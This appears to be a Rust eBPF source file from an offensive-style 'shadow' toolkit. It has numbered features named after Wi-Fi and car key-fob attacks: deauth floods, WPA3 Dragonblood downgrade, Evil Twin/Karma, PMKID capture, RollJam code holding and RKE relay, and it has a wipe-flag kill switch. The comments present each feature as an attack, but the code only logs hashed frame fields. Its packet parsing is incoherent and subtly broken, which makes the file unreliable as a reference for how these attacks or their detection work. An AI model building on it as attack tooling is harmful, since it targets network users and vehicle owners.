use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    EventHeader, RkeFobState, WifiClientState, EVENT_EVIL_TWIN_KARMA, EVENT_FT_ROAMING_ABUSE,
    EVENT_PMKID_CAPTURE, EVENT_RKE_RELAY_ATTACK, EVENT_ROLLJAM_ATTACK, EVENT_WIFI_DEAUTH_FLOOD,
    EVENT_WPA3_DRAGONBLOOD,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;

const WIFI_FC_DEAUTH: u8 = 0xC0; // mgmt frame control: deauthentication
const WIFI_FC_DISASSOC: u8 = 0xA0; // mgmt frame control: disassociation
const WIFI_DEAUTH_FLOOD_THRESHOLD: u32 = 8; // frames before flood is declared
const WIFI_FC_AUTH: u8 = 0xB0; // mgmt frame control: authentication
const SAE_AUTH_ALG: u16 = 0x0003; // SAE (WPA3) authentication algorithm
const SAE_GROUP_P256: u16 = 19; // default SAE curve; anything else is a downgrade
const WIFI_FC_PROBE_REQ: u8 = 0x40; // mgmt frame control: probe request
const FT_AUTH_ALG: u16 = 0x0002; // 802.11r Fast BSS Transition algorithm
const EAPOL_ETHERTYPE: u16 = 0x888E; // EAPOL-Packet ethertype
const ROLLJAM_CODE_MARKER: u8 = 0x5A; // OOK rolling-code frame marker
const RKE_FREQ_315MHZ: u32 = 315000; // kHz — NA key fobs
const RKE_FREQ_433MHZ: u32 = 433920; // kHz — EU key fobs
const RKE_RELAY_WAKE: u8 = 0x20; // 125 kHz LF challenge wake marker

// ──────────────────────────────────────────────
// FEATURE 151: Deauth/Disassoc Flood
// Floods management frames to disconnect clients from their AP
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_wifi_deauth_flood(ctx: TcContext) -> i32 {
    try_wifi_deauth_flood(&ctx).unwrap_or(0)
}

fn try_wifi_deauth_flood(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 > data_end {
        return Ok(0);
    }

    let payload_offset = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let fc = unsafe { *((data + payload_offset) as *const u8) };

    if fc == WIFI_FC_DEAUTH || fc == WIFI_FC_DISASSOC {
        // transmitter (AP) address fragment follows the frame control
        let bssid_hash = u32::from_le_bytes([
            unsafe { *((data + payload_offset + 1) as *const u8) },
            unsafe { *((data + payload_offset + 2) as *const u8) },
            unsafe { *((data + payload_offset + 3) as *const u8) },
            unsafe { *((data + payload_offset + 4) as *const u8) },
        ]) ^ ((unsafe { *((data + payload_offset + 5) as *const u8) } as u32)
            << 8
            | unsafe { *((data + payload_offset + 6) as *const u8) } as u32);

        let mut deauth_count = 1;
        if let Some(prev) = unsafe { WIFI_CLIENTS.get(&bssid_hash) } {
            deauth_count = prev.deauth_count + 1;
        }

        let state = WifiClientState {
            bssid_hash,
            ssid_hash: 0,
            client_addr_hash: 0,
            deauth_count,
            mgmt_subtype: (fc >> 4) as u32,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = WIFI_CLIENTS.insert(&bssid_hash, &state, 0);

        if deauth_count > WIFI_DEAUTH_FLOOD_THRESHOLD {
            let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
            let event = EventHeader {
                event_type: EVENT_WIFI_DEAUTH_FLOOD,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((deauth_count as u64) << 32) | bssid_hash as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 152: WPA3 Dragonblood Exploit
// Forces SAE group downgrade to a weak elliptic curve
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_wpa3_dragonblood(ctx: ProbeContext) -> u32 {
    try_wpa3_dragonblood(&ctx).unwrap_or(0)
}

fn try_wpa3_dragonblood(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == WIFI_FC_AUTH {
        let auth_alg = u16::from_le_bytes([hdr[1], hdr[2]]);

        if auth_alg == SAE_AUTH_ALG {
            // SAE commit token carries the proposed curve group
            let group = u16::from_le_bytes([hdr[3], hdr[4]]);
            if group != SAE_GROUP_P256 {
                // weak curve: side-channel (CVE-2019-9494..9497) territory
                let client_hash = u32::from_le_bytes([hdr[5], hdr[6], hdr[7], hdr[3]]);

                let state = WifiClientState {
                    bssid_hash: 0,
                    ssid_hash: 0,
                    client_addr_hash: client_hash,
                    deauth_count: 0,
                    mgmt_subtype: 11,
                    _pad: 0,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                };
                let _ = WIFI_CLIENTS.insert(&client_hash, &state, 0);

                let event = EventHeader {
                    event_type: EVENT_WPA3_DRAGONBLOOD,
                    pid,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                    context: ((group as u64) << 32) | client_hash as u64,
                };
                let _ = EVENTS.output(&event, 0);
            }
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 153: Evil Twin/Karma Attack
// Answers every probe request to lure clients onto the rogue AP
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_evil_twin_karma(ctx: ProbeContext) -> u32 {
    try_evil_twin_karma(&ctx).unwrap_or(0)
}

fn try_evil_twin_karma(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == WIFI_FC_PROBE_REQ {
        // Karma: echo the probed SSID back with a stronger signal
        let ssid_hash = u32::from_le_bytes([hdr[1], hdr[2], hdr[3], hdr[4]]);
        let client_hash = u32::from_le_bytes([hdr[5], hdr[6], hdr[7], hdr[1]]);

        let state = WifiClientState {
            bssid_hash: 0,
            ssid_hash,
            client_addr_hash: client_hash,
            deauth_count: 0,
            mgmt_subtype: 4,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = WIFI_CLIENTS.insert(&client_hash, &state, 0);

        let event = EventHeader {
            event_type: EVENT_EVIL_TWIN_KARMA,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((ssid_hash as u64) << 32) | client_hash as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 154: FT Roaming Abuse
// Extracts PMKR1 from 802.11r FT authentication frames
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_ft_roaming_abuse(ctx: TcContext) -> i32 {
    try_ft_roaming_abuse(&ctx).unwrap_or(0)
}

fn try_ft_roaming_abuse(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 > data_end {
        return Ok(0);
    }

    let payload_offset = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let fc = unsafe { *((data + payload_offset) as *const u8) };

    if fc == WIFI_FC_AUTH {
        let auth_alg = u16::from_le_bytes([
            unsafe { *((data + payload_offset + 1) as *const u8) },
            unsafe { *((data + payload_offset + 2) as *const u8) },
        ]);

        if auth_alg == FT_AUTH_ALG {
            // FT auth carries PMKR1 name — session hijack material mid-roam
            let pmkr1_hash = u32::from_le_bytes([
                unsafe { *((data + payload_offset + 3) as *const u8) },
                unsafe { *((data + payload_offset + 4) as *const u8) },
                unsafe { *((data + payload_offset + 5) as *const u8) },
                unsafe { *((data + payload_offset + 6) as *const u8) },
            ]);

            let state = WifiClientState {
                bssid_hash: pmkr1_hash,
                ssid_hash: 0,
                client_addr_hash: 0,
                deauth_count: 0,
                mgmt_subtype: 11,
                _pad: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
            };
            let _ = WIFI_CLIENTS.insert(&pmkr1_hash, &state, 0);

            let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
            let event = EventHeader {
                event_type: EVENT_FT_ROAMING_ABUSE,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((auth_alg as u64) << 32) | pmkr1_hash as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 155: PMKID Capture
// Extracts PMKID from the first EAPOL frame for offline cracking
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_pmkid_capture(ctx: ProbeContext) -> u32 {
    try_pmkid_capture(&ctx).unwrap_or(0)
}

fn try_pmkid_capture(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    let ethertype = u16::from_be_bytes([hdr[0], hdr[1]]);
    if ethertype == EAPOL_ETHERTYPE {
        // EAPOL-Key frame: descriptor/key-info then the PMKID KDE —
        // no full 4-way handshake or active client needed
        let key_info = u16::from_be_bytes([hdr[2], hdr[3]]);
        let pmkid_hash = u32::from_be_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);

        let state = WifiClientState {
            bssid_hash: pmkid_hash,
            ssid_hash: 0,
            client_addr_hash: 0,
            deauth_count: 0,
            mgmt_subtype: 0,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = WIFI_CLIENTS.insert(&pmkid_hash, &state, 0);

        let event = EventHeader {
            event_type: EVENT_PMKID_CAPTURE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((key_info as u64) << 32) | pmkid_hash as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 156: RollJam Rolling Code Attack
// Jams and stores valid fob codes for later replay
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_rolljam_attack(ctx: ProbeContext) -> u32 {
    try_rolljam_attack(&ctx).unwrap_or(0)
}

fn try_rolljam_attack(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 12] =
        unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 12])? };

    if hdr[0] == ROLLJAM_CODE_MARKER {
        // OOK frame: fob id, rolling code, band-select nibble
        let fob_id = u32::from_be_bytes([hdr[1], hdr[2], hdr[3], hdr[4]]);
        let code = u32::from_be_bytes([hdr[5], hdr[6], hdr[7], hdr[8]]);
        let frequency_khz = if hdr[9] & 0x01 == 0 {
            RKE_FREQ_315MHZ
        } else {
            RKE_FREQ_433MHZ
        };

        // hold the captured code while the vehicle misses it (jam window):
        // a fresh code on a known fob is a held shot for later replay
        let mut code_count = 1;
        let held = if let Some(prev) = unsafe { RKE_FOB_STATE.get(&fob_id) } {
            code_count = prev.code_count + 1;
            (code != prev.last_code) as u64
        } else {
            0
        };

        let state = RkeFobState {
            fob_id,
            frequency_khz,
            code_count,
            last_code: code,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = RKE_FOB_STATE.insert(&fob_id, &state, 0);

        let event = EventHeader {
            event_type: EVENT_ROLLJAM_ATTACK,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((fob_id as u64) << 1) | held,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 157: RKE Relay/Amplification Attack
// Relays the LF challenge-response to extend fob range
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_rke_relay_attack(ctx: XdpContext) -> u32 {
    try_rke_relay_attack(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_rke_relay_attack(ctx: &XdpContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(xdp_action::XDP_PASS);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let payload_offset = data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let wake = unsafe { *(payload_offset as *const u8) };

    if wake == RKE_RELAY_WAKE {
        // 125 kHz LF challenge relayed over IP; response names the fob
        let fob_id = u32::from_be_bytes([
            unsafe { *((payload_offset + 1) as *const u8) },
            unsafe { *((payload_offset + 2) as *const u8) },
            unsafe { *((payload_offset + 3) as *const u8) },
            unsafe { *((payload_offset + 4) as *const u8) },
        ]);
        let rtt_us =
            u16::from_be_bytes([unsafe { *((payload_offset + 5) as *const u8) }, unsafe {
                *((payload_offset + 6) as *const u8)
            }]);

        let state = RkeFobState {
            fob_id,
            frequency_khz: 0,
            code_count: 0,
            last_code: 0,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = RKE_FOB_STATE.insert(&fob_id, &state, 0);

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_RKE_RELAY_ATTACK,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((fob_id as u64) << 16) | rtt_us as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(xdp_action::XDP_PASS)
}
